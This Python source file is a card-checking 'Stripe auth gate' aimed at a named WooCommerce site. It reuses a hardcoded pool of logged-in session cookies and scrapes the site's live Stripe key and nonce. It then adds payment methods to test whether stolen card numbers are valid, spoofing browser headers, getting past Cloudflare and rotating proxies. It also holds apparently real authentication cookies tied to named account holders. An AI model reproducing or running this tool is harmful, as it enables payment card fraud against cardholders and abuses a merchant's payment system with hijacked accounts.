# ============================================================
#  Auth Stripe Gate — Ported from heater.py
#  Uses pre-authenticated WooCommerce account pool
#  Site: associationsmanagement.com
# ============================================================

import re
import time
import random
import uuid
import requests
import logging
import threading

try:
    import cloudscraper
except ImportError:
    cloudscraper = None

logging.basicConfig(level=logging.ERROR)
logger = logging.getLogger(__name__)

# Account pool with pre-authenticated cookies
ACCOUNT_POOL = [
    {
        'name': 'Xray Xlea',
        'cookies': {
            '_ga': 'GA1.2.493930677.1768140612',
            '__stripe_mid': '66285028-f520-443b-9655-daf7134b8b855e5f16',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'xrayxlea%7C1769350388%7CxGcUPPOJgEHPSWiTK6F9YZpA6v4AgHki1B2Hxp0Zah5%7C3b8f3e6911e25ea6cccc48a4a0be35ed25e0479c9e90ccd2f16aa41cac04277d',
            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '7670%7Cother%7Cread%7Cb723e85c048d2147e793e6640d861ae4f4fddd513abc1315f99355cf7d2bc455',
            '__cf_bm': 'rd1MFUeDPNtBzTZMChisPSRIJpZKLlo5dgif0o.e_Xw-1769258154-1.0.1.1-zhaKFI8L0JrFcuTzj.N9OkQvBuz6HvNmFFKCSqfn_gE2EF3GD65KuZoLGPuEhRyVwkKakMr_mcjUehEY1mO9Kb9PKq1x5XN41eXwXQavNyk',
            '__stripe_sid': '4f84200c-3b60-4204-bbe8-adc3286adebca426c8',
        }
    },
    {
        'name': 'Yasin Akbulut',
        'cookies': {
            '__cf_bm': 'zMehglRiFuX3lzj170gpYo3waDHipSMK0DXxfB63wlk-1769340288-1.0.1.1-ppt5LELQNDnJzFl1hN13LWwuQx5ZFdMS9b0SP4A3j7kasxaqEBMgSJ3vu9AbzyFOlbCozpAr.hE.g3xFpU_juaLp1heupyxmSrmte1Gn7g0',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'akbulutyasin836%7C1770549977%7CwdF5vz1qFXPSxofozNx9OwxFdmIoSdQKxaHlkOkjL2o%7C4d5f40c1bf01e0ccd6a59fdf08eb8f5aeb609c05d4d19fe41419a82433ffc1fa',
            '__stripe_mid': '2d2e501a-542d-4635-98ec-e9b2ebe26b4c9ac02a',
            '__stripe_sid': 'b2c6855b-7d29-4675-8fe4-b5c4797045132b8dea',
            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '8214%7Cother%7Cread%7Cde5fd05c6afc735d5df323de21ff23f598bb5e1893cb9a7de451b7a8d50dc782',
        }
    },
    {
        'name': 'Mehmet Demir',
        'cookies': {
            '__cf_bm': 'zMehglRiFuX3lzj170gpYo3waDHipSMK0DXxfB63wlk-1769340288-1.0.1.1-ppt5LELQNDnJzFl1hN13LWwuQx5ZFdMS9b0SP4A3j7kasxaqEBMgSJ3vu9AbzyFOlbCozpAr.hE.g3xFpU_juaLp1heupyxmSrmte1Gn7g0',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'akbulutyasin836%7C1770549977%7CwdF5vz1qFXPSxofozNx9OwxFdmIoSdQKxaHlkOkjL2o%7C4d5f40c1bf01e0ccd6a59fdf08eb8f5aeb609c05d4d19fe41419a82433ffc1fa',
            '__stripe_mid': '2d2e501a-542d-4635-98ec-e9b2ebe26b4c9ac02a',
            '__stripe_sid': 'b2c6855b-7d29-4675-8fe4-b5c4797045132b8dea',
            'sbjs_migrations': '1418474375998%3D1',
        }
    },
    {
        'name': 'Ahmet Aksoy',
        'cookies': {
            '__cf_bm': 'aidh4Te7pipYMK.tLzhoGhXGelOgYCnYQJ525DEIqNM-1769341631-1.0.1.1-HSRHKAbOct2k1bbWIIdIN7b5fzWFydAtRqz2W0pAdRXrbVusNthJCJvU5fc7d3RkZEOZ5ZXZghJ4J2jmYzIcdJGDbb90txn4HPgSKJ6neA8',
            '_ga': 'GA1.2.1596026899.1769341671',
            '_gid': 'GA1.2.776441.1769341671',
            '__stripe_mid': '1b0100cd-503c-4665-b43b-3f5eb8b4edcdaae8bd',
            '__stripe_sid': '0f1ce17f-f7a9-4d26-bd37-52d402d30d1a8716bf',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'ahmetaksoy2345%7C1770551236%7CGF3svY4oh1UiTMXJ9iUXXuXtimHSG6PHiW0Sm5wrDbt%7Ce810ede4e1743cd73dc8dacdd56598ecf4ceaa383052d9b50d1bbd6c02da7237',
            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '8216%7Cother%7Cread%7C70f37e1a77141c049acd75715a8d1aef6d47b285656c907c79392a55e787d97e',
        }
    },
    {
        'name': 'Dlallah',
        'cookies': {
            '__cf_bm': 'nwW.aCdcJXW8SAKZYpmEuqU6gCsNM1ibgP9mNKqXuYw-1769341811-1.0.1.1-hkeF4QihuQfbJD7DRqQcILcMycgxTqxxHcqwsU6oR8WsdViGcVMbX0CHqmx76N8wUEuIQwLFooNTm2gjGrRCKlURh4vf1ghD3gkz18KjyWg',
            '__stripe_mid': 'c7368749-b4fc-4876-bb97-bc07cc8a36b5851848',
            '__stripe_sid': 'b9d4dfb2-bba4-4ee6-9c72-8acf6acfe138efd65d',
            '_ga': 'GA1.2.1162515809.1769341851',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'dlallah%7C1770551422%7CiMfIpOcXTEo2Y9rmVMf3Mpf0kpkC4An81IgT0ZfMLff%7C01fbc5549954aa84d4f1b6c62bc44ebe65df58be0b82014d1b246c220d361231',
            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '8217%7Cother%7Cread%7C24531823e5d32b0ad918bef860997fced3f0b92cce7ba200e3a753e050b546d3',
        }
    }
]

SITE_URL = "https://associationsmanagement.com"
APM_URL = f"{SITE_URL}/my-account/add-payment-method/"
AJAX_URL = f"{SITE_URL}/wp-admin/admin-ajax.php"

ULTRA_HEADERS = {
    'authority': 'associationsmanagement.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language': 'en-US,en;q=0.9',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

# ============================================================
#  BIN cache — avoids hammering BIN APIs on mass checks
# ============================================================
_bin_cache = {}
_bin_cache_lock = threading.Lock()


def _get_bin_info(bin6):
    """Multi-API BIN lookup with in-memory cache."""
    bin6 = bin6.replace(" ", "")[:6]

    with _bin_cache_lock:
        if bin6 in _bin_cache:
            return _bin_cache[bin6]

    apis = [
        (f"https://api.voidex.dev/api/bin?bin={bin6}", "voidex"),
        (f"https://binsapi.vercel.app/api/bin/{bin6}", "binsapi"),
        (f"https://bins.antipublic.cc/bins/{bin6}", "antipublic"),
        (f"https://lookup.binlist.net/{bin6}", "binlist"),
    ]

    for api_url, src in apis:
        try:
            headers = {"Accept": "application/json"}
            if src == "binlist":
                headers["Accept-Version"] = "3"
            r = requests.get(api_url, timeout=6, headers=headers)
            if r.status_code != 200:
                continue
            data = r.json()

            # Normalize across different API shapes
            brand = (
                data.get('scheme') or data.get('brand') or
                data.get('Brand') or data.get('cardBrand') or 'N/A'
            )
            if isinstance(brand, str):
                brand = brand.upper()
            else:
                brand = 'N/A'

            bank_raw = data.get('bank')
            if isinstance(bank_raw, dict):
                bank = bank_raw.get('name', 'N/A')
            elif isinstance(bank_raw, str):
                bank = bank_raw
            else:
                bank = data.get('Bank') or data.get('issuer') or 'N/A'
            bank = bank.upper() if isinstance(bank, str) else 'N/A'

            country_raw = data.get('country')
            if isinstance(country_raw, dict):
                country = country_raw.get('name', 'N/A')
                emoji = country_raw.get('emoji', '')
            elif isinstance(country_raw, str):
                country = country_raw
                emoji = data.get('emoji', '')
            else:
                country = data.get('Country') or 'N/A'
                emoji = data.get('emoji', '')
            country = country.upper() if isinstance(country, str) else 'N/A'
            if not emoji:
                emoji = ''

            if brand != 'N/A' or bank != 'N/A':
                result = {"brand": brand, "bank": bank, "country": country, "emoji": emoji}
                with _bin_cache_lock:
                    _bin_cache[bin6] = result
                return result
        except Exception:
            continue

    fallback = {"brand": "N/A", "bank": "N/A", "country": "N/A", "emoji": ""}
    with _bin_cache_lock:
        _bin_cache[bin6] = fallback
    return fallback


def _process_card(cc, mm, yy, cvv, proxy_dict=None):
    """Stripe auth check using pre-authenticated account pool."""
    try:
        yy_full = f"20{yy[-2:]}" if len(yy) <= 2 else yy
        acc = random.choice(ACCOUNT_POOL)

        if cloudscraper:
            scraper = cloudscraper.create_scraper(
                browser={'browser': 'chrome', 'platform': 'android', 'mobile': True}
            )
        else:
            scraper = requests.Session()

        # Proxy only for site requests, NOT for Stripe API
        if proxy_dict:
            scraper.proxies.update(proxy_dict)

        scraper.cookies.update(acc['cookies'])
        scraper.headers.update(ULTRA_HEADERS)

        # Step 1: Load add-payment-method page
        try:
            r_page = scraper.get(APM_URL, timeout=20)
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout,
                requests.exceptions.ProxyError, ConnectionError, OSError) as e:
            return {"status": "ConnError", "response": str(e)[:80]}

        if r_page.status_code == 429:
            return {"status": "ConnError", "response": "Rate limited (429)"}
        if r_page.status_code == 503:
            return {"status": "ConnError", "response": "Service unavailable (503)"}
        if r_page.status_code != 200:
            return {"status": "Error", "response": f"Site HTTP {r_page.status_code}"}

        pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', r_page.text)
        if not pk_match:
            return {"status": "Error", "response": "Stripe key not found"}
        pk_live = pk_match.group(0)

        nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"([a-z0-9]+)"', r_page.text)
        if not nonce_match:
            return {"status": "Error", "response": "Setup nonce not found"}
        addnonce = nonce_match.group(1)

        time.sleep(random.uniform(0.3, 0.8))

        # Step 2: Create payment method on Stripe (DIRECT — no proxy needed)
        stripe_session = requests.Session()
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': ULTRA_HEADERS['user-agent'],
        }

        stripe_payload = (
            f'type=card&card[number]={cc}&card[cvc]={cvv}'
            f'&card[exp_year]={yy_full}&card[exp_month]={mm}'
            f'&billing_details[name]={acc["name"].replace(" ", "+")}'
            f'&billing_details[address][postal_code]=10001'
            f'&key={pk_live}'
            f'&muid={acc["cookies"].get("__stripe_mid", str(uuid.uuid4()))}'
            f'&sid={acc["cookies"].get("__stripe_sid", str(uuid.uuid4()))}'
            f'&guid={str(uuid.uuid4())}'
            f'&payment_user_agent=stripe.js%2F8f77e26090%3B+stripe-js-v3%2F8f77e26090%3B+checkout'
            f'&time_on_page={random.randint(90000, 150000)}'
        )

        try:
            r_stripe = stripe_session.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=stripe_headers, data=stripe_payload, timeout=12
            )
        except Exception as e:
            return {"status": "ConnError", "response": f"Stripe API: {str(e)[:60]}"}

        stripe_json = r_stripe.json()

        if 'id' not in stripe_json:
            err = stripe_json.get('error', {}).get('message', 'Radar Block')
            return {"status": "Declined", "response": err[:120]}

        pm_id = stripe_json['id']

        # Step 3: Confirm setup intent via WooCommerce AJAX
        ajax_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': addnonce,
        }

        try:
            r_ajax = scraper.post(AJAX_URL, data=ajax_data, timeout=20)
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout,
                requests.exceptions.ProxyError, ConnectionError, OSError) as e:
            return {"status": "ConnError", "response": str(e)[:80]}

        ajax_text = r_ajax.text.lower()

        if '"success":true' in ajax_text or 'insufficient_funds' in ajax_text:
            if 'insufficient_funds' in ajax_text:
                return {"status": "Approved", "response": "Approved (Insufficient Funds) ✅"}
            return {"status": "Approved", "response": "Payment Method Added ✅"}

        if 'incorrect_cvc' in ajax_text:
            return {"status": "Approved", "response": "CVC Matched ✅"}

        reason = re.search(r'message":"(.*?)"', r_ajax.text)
        return {"status": "Declined", "response": (reason.group(1) if reason else "Rejected")[:120]}

    except Exception as e:
        err_str = str(e)[:80]
        # Classify connection-type errors
        conn_keywords = ["Max retries", "ConnectionPool", "ConnectionError",
                         "Timeout", "Connection refused", "Connection reset",
                         "SSLError", "RemoteDisconnected"]
        if any(k in err_str for k in conn_keywords):
            return {"status": "ConnError", "response": err_str}
        return {"status": "Error", "response": err_str}


def check_card(cc_line, proxy_dict=None):
    """Public entry point. cc_line: CC|MM|YY|CVV"""
    start = time.time()
    parts = cc_line.strip().split('|')
    if len(parts) != 4:
        return "Error | Invalid format (CC|MM|YY|CVV)"

    cc, mm, yy, cvv = [p.strip() for p in parts]
    result = _process_card(cc, mm, yy, cvv, proxy_dict)
    elapsed = time.time() - start

    status = result.get("status", "Error")
    response = result.get("response", "Unknown")

    # Connection errors — return special marker for tg_bot to retry with different proxy
    if status == "ConnError":
        return f"ConnError | {response}"

    # Only look up BIN for real results (not errors)
    bin_info = _get_bin_info(cc[:6])

    if status == "Approved":
        return (
            f"Approved | {response}\n"
            f"Card: {cc}|{mm}|{yy}|{cvv}\n"
            f"Gateway: Stripe Auth\n"
            f"BIN: {bin_info['brand']} - {bin_info['country']} {bin_info['emoji']}\n"
            f"Bank: {bin_info['bank']}\n"
            f"Time: {elapsed:.1f}s"
        )
    elif status == "Declined":
        return (
            f"Declined | {response}\n"
            f"Card: {cc}|{mm}|{yy}|{cvv}\n"
            f"Gateway: Stripe Auth\n"
            f"BIN: {bin_info['brand']} - {bin_info['country']} {bin_info['emoji']}\n"
            f"Time: {elapsed:.1f}s"
        )
    else:
        return f"Error | {response}"


def probe_site():
    """Health check for the auth gate."""
    try:
        r = requests.get(
            APM_URL,
            headers={"User-Agent": ULTRA_HEADERS['user-agent']},
            timeout=10, allow_redirects=True,
        )
        alive = r.status_code == 200 and 'stripe' in r.text.lower()
        return alive, f"HTTP {r.status_code}" + (" | Stripe key found" if alive else " | No Stripe key")
    except Exception as e:
        return False, str(e)[:60]
